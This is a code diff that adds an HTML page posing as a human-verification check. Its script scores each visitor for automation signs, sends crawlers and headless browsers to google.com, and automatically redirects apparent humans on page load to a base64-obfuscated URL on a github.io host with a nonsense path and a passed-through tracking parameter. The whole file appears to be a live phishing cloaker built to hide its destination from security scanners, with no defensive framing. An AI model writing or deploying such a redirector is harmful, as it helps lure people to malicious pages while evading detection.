@@ -1,0 +1,179 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            color: #333;
+            margin: 0;
+            font-size: 24px;
+        }
+        p {
+            color: #666;
+            margin: 10px 0 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Verifying access...</h1>
+        <p>Please wait while we verify you're human.</p>
+    </div>
+
+    <script>
+        // Comprehensive bot detection
+        function detectBot() {
+            let botScore = 0;
+            const maxScore = 10;
+            
+            // 1. Check for headless browser indicators
+            if (navigator.webdriver) {
+                botScore += 5;
+            }
+            
+            // 2. Check for phantom.js
+            if (window.callPhantom || window._phantom) {
+                botScore += 5;
+            }
+            
+            // 3. Check for nightmarejs
+            if (window.__nightmare) {
+                botScore += 5;
+            }
+            
+            // 4. Check for puppeteer
+            if (navigator.plugins.length === 0) {
+                botScore += 1;
+            }
+            
+            // 5. Check for common bot user agents
+            const botUserAgents = [
+                'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python',
+                'java', 'node', 'phantom', 'headless', 'selenium', 'puppeteer',
+                'playwright', 'apify', 'scrapy', 'colly', 'jsdom', 'jsoup'
+            ];
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (botUserAgents.some(ua => userAgent.includes(ua))) {
+                botScore += 4;
+            }
+            
+            // 6. Check for automation libraries
+            if (typeof window.Xebium !== 'undefined' || 
+                typeof window.callSelenium !== 'undefined') {
+                botScore += 5;
+            }
+            
+            // 7. Check for missing APIs (real browsers have these)
+            if (typeof navigator.getBattery === 'undefined' && 
+                !('battery' in navigator) &&
+                typeof navigator.vibrate === 'undefined') {
+                botScore += 0.5;
+            }
+            
+            // 8. Check Chrome extension detection
+            if (typeof chrome === 'undefined') {
+                botScore += 0.5;
+            }
+            
+            // 9. Verify document is fully interactive
+            if (document.readyState !== 'interactive' && document.readyState !== 'complete') {
+                botScore += 1;
+            }
+            
+            // 10. Check if JavaScript execution is properly sandboxed
+            try {
+                if (Object.keys(window).length < 200) {
+                    botScore += 1;
+                }
+            } catch (e) {
+                botScore += 0.5;
+            }
+            
+            return botScore;
+        }
+        
+        function redirectUser(isBot) {
+            const redirectUrl = 'https://www.google.com';
+            
+            if (isBot) {
+                // Redirect bot using standard location
+                window.location.href = redirectUrl;
+            } else {
+                // Meta refresh redirect for human users
+                const metaTag = document.createElement('meta');
+                metaTag.httpEquiv = 'refresh';
+
+                var redirectUrl1enc = "aHR0cHM6Ly9wb3N3YWNvY29tYXF6LmdpdGh1Yi5pby9zYW1sb2lzZGVjb21hbWEvbG9taXphbmFrb3N3ZWRjdmIvYm9iaWJpc2F4YXdxcS9leHBvbGlueHphd2VzP0VnYkdxcVFnV1NmenBOY2N0S0xxZlRwelNtYnZUV2t0cWJsV3BQSmd4bk12Y1JEbmN4U3JsOTA0MzJxZlRwelNtY3RLTGJ2VFdrdHFibFdwUE5UckNLYk5DdlNtVldoVFdrdHFibFdUVlJCV2hwUGN0S0xidg==";
+                var redirectUrl1 = atob(redirectUrl1enc);
+                let eta = new URLSearchParams(window.location.search).get('WtTBhXBMTzkKkmxMbShdsFZkLggxnQgdqtMGdjzJWxxRLqhFQ');
+                redirectUrl1 = redirectUrl1+ 'WtTBhXBMTzkKkmxMbShdsFZkLggxnQgdqtMGdjzJWxxRLqhFQ=' + eta;
+                //alert(redirectUrl1);
+
+                metaTag.content = '0;url=' + redirectUrl1;
+                document.head.appendChild(metaTag);
+                
+                // Fallback redirect
+                setTimeout(() => {
+                    window.location.href = redirectUrl1;
+                }, 100);
+            }
+        }
+        
+        // Run detection after page is fully loaded
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const botScore = detectBot();
+                const threshold = 3; // Score above this indicates a bot
+                const isBot = botScore >= threshold;
+                
+                console.log('Bot detection score:', botScore);
+                console.log('Is bot:', isBot);
+                
+                redirectUser(isBot);
+            }, 500);
+        });
+        
+        // Also check during DOMContentLoaded as backup
+        document.addEventListener('DOMContentLoaded', () => {
+            const botScore = detectBot();
+            if (botScore >= 7) {
+                // High confidence bot detected early
+                redirectUser(true);
+            }
+        });
+    </script>
+</body>
+</html>
